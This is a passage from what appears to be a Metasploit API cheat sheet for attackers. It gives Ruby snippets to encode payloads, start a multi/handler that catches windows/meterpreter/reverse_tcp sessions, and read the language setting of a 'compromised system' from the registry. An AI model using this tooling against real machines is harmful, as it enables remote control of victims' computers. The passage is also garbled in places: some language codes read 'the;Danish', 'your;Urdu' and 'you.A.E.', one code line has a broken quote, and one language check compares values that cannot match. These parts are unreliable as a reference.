        print_warning("Usage: #{File.basename(__FILE__)} encoder_name file_name format")
        return nil
      end

      framework = Msf::Simple::Framework.create
        begin
        # Create the encoder instance.
        mod = framework.encoders.create(ARGV.shift)
        Msf::Simple::Buffer.transform(mod.encode(IO.readlines(ARGV.shift).join), ARGV.shift || ’ruby’
      rescue
        print_error("Error: #{$!}\n\n#{$@.join("\n")}")
      end


- **start a multi handler (local)**

      mul = client.framework.exploits.create("multi/handler")
      mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
      mul.datastore['LHOST']     = rhost
      mul.datastore['LPORT']     = rport
      mul.datastore['EXITFUNC']  = 'process'
      mul.datastore['ExitOnSession'] = false

      mul.exploit_simple(
        'Payload'        => mul.datastore['PAYLOAD'],
        'RunAsJob'       => true
      )
      end

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

<br /><br /><br />

## DISCOVER SYSTEM LANGUAGE

> This will give us the operating system language of the compromised system.<br />

- **Discover system language using msf API**

      output = client.sys.config.sysinfo['System Language']
      print_good("System lang detected: #{output}")

- **Discover system language using cmd_exec()**

      check = cmd_exec("REG QUERY HKLM\System\CurrentControlSet\Control\Nls\Language /v InstallLanguage")
      if check == "0436"
        parse = "af;Afrikaans"
      elsif check == "041c"
        parse = "sq;Albanian"
      else
        print_error("module can not determine system language")
      end
      print_good("system language detected: #{parse}")

- **InstallLAnguage codes (regedit)**

      0436 = "af;Afrikaans"
      041C = "sq;Albanian"
      0001 = "ar;Arabic"
      0401 = "ar-sa;Arabic (Saudi Arabia)"
      0801 = "ar-iq;Arabic (Iraq)"
      0C01 = "ar-eg;Arabic (Egypt)"
      1001 = "ar-ly;Arabic (Libya)"
      1401 = "ar-dz;Arabic (Algeria)"
      1801 = "ar-ma;Arabic (Morocco)"
      1C01 = "ar-tn;Arabic (Tunisia)"
      2001 = "ar-om;Arabic (Oman)"
      2401 = "ar-ye;Arabic (Yemen)"
      2801 = "ar-sy;Arabic (Syria)"
      2C01 = "ar-jo;Arabic (Jordan)"
      3001 = "ar-lb;Arabic (Lebanon)"
      3401 = "ar-kw;Arabic (Kuwait)"
      3801 = "ar-ae;Arabic (you.A.E.)"
      3C01 = "ar-bh;Arabic (Bahrain)"
      4001 = "ar-qa;Arabic (Qatar)"
      042D = "eu;Basque"
      0402 = "bg;Bulgarian"
      0423 = "be;Belarusian"
      0403 = "ca;Catalan"
      0004 = "zh;Chinese"
      0404 = "zh-tw;Chinese (Taiwan)"
      0804 = "zh-cn;Chinese (China)"
      0C04 = "zh-hk;Chinese (Hong Kong SAR)"
      1004 = "zh-sg;Chinese (Singapore)"
      041A = "hr;Croatian"
      0405 = "cs;Czech"
      0406 = "the;Danish"
      0413 = "nl;Dutch (Netherlands)"
      0813 = "nl-be;Dutch (Belgium)"
      0009 = "en;English"
      0409 = "en-us;English (United States)"
      0809 = "en-gb;English (United Kingdom)"
      0C09 = "en-au;English (Australia)"
      1009 = "en-ca;English (Canada)"
      1409 = "en-nz;English (New Zealand)"
      1809 = "en-ie;English (Ireland)"
      1C09 = "en-za;English (South Africa)"
      2009 = "en-jm;English (Jamaica)"
      2809 = "en-bz;English (Belize)"
      2C09 = "en-tt;English (Trinidad)"
      0425 = "et;Estonian"
      0438 = "fo;Faeroese"
      0429 = "fa;Farsi"
      040B = "fi;Finnish"
      040C = "fr;French (France)"
      080C = "fr-be;French (Belgium)"
      0C0C = "fr-ca;French (Canada)"
      100C = "fr-ch;French (Switzerland)"
      140C = "fr-lu;French (Luxembourg)"
      043C = "gd;Gaelic"
      0407 = "de;German (Germany)"
      0807 = "de-ch;German (Switzerland)"
      0C07 = "de-at;German (Austria)"
      1007 = "de-lu;German (Luxembourg)"
      1407 = "de-li;German (Liechtenstein)"
      0408 = "el;Greek"
      040D = "he;Hebrew"
      0439 = "hi;Hindi"
      040E = "hu;Hungarian"
      040F = "is;Icelandic"
      0421 = "in;Indonesian"
      0410 = "it;Italian (Italy)"
      0810 = "it-ch;Italian (Switzerland)"
      0411 = "ja;Japanese"
      0412 = "ko;Korean"
      0426 = "lv;Latvian"
      0427 = "lt;Lithuanian"
      042F = "mk;FYRO Macedonian"
      043E = "ms;Malay (Malaysia)"
      043A = "mt;Maltese" 0414 = "no;Norwegian (Bokmal)"
      0814 = "no;Norwegian (Nynorsk)"
      0415 = "pl;Polish"
      0416 = "pt-br;Portuguese (Brazil)"
      0816 = "pt;Portuguese (Portugal)"
      0417 = "rm;Rhaeto-Romanic"
      0418 = "ro;Romanian"
      0818 = "ro-mo;Romanian (Moldova)"
      0419 = "ru;Russian"
      0819 = "ru-mo;Russian (Moldova)"
      0C1A = "sr;Serbian (Cyrillic)"
      081A = "sr;Serbian (Latin)"
      041B = "sk;Slovak"
      0424 = "sl;Slovenian"
      042E = "sb;Sorbian"
      040A = "es;Spanish (Traditional Sort)"
      080A = "es-mx;Spanish (Mexico)"
      0C0A = "es;Spanish (International Sort)"
      100A = "es-gt;Spanish (Guatemala)"
      140A = "es-cr;Spanish (Costa Rica)"
      180A = "es-pa;Spanish (Panama)"
      1C0A = "es-do;Spanish (Dominican Republic)"
      200A = "es-ve;Spanish (Venezuela)"
      240A = "es-co;Spanish (Colombia)"
      280A = "es-pe;Spanish (Peru)"
      2C0A = "es-ar;Spanish (Argentina)"
      300A = "es-ec;Spanish (Ecuador)"
      340A = "es-cl;Spanish (Chile)"
      380A = "es-uy;Spanish (Uruguay)"
      3C0A = "es-py;Spanish (Paraguay)"
      400A = "es-bo;Spanish (Bolivia)"
      440A = "es-sv;Spanish (El Salvador)"
      480A = "es-hn;Spanish (Honduras)"
      4C0A = "es-ni;Spanish (Nicaragua)"
      500A = "es-pr;Spanish (Puerto Rico)"
      0430 = "sx;Sutu"
      041D = "sv;Swedish"
      081D = "sv-fi;Swedish (Finland)"
      041E = "th;Thai"
      0431 = "ts;Tsonga"
      0432 = "tn;Tswana"
      041F = "tr;Turkish"
      0422 = "uk;Ukrainian"
      0420 = "your;Urdu"
      042A = "vi;Vietnamese"
      0434 = "xh;Xhosa"
      043D = "ji;Yiddish"
      0435 = "zu;Zulu"

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)

---

### Suspicious Shell Activity @2019

EOF
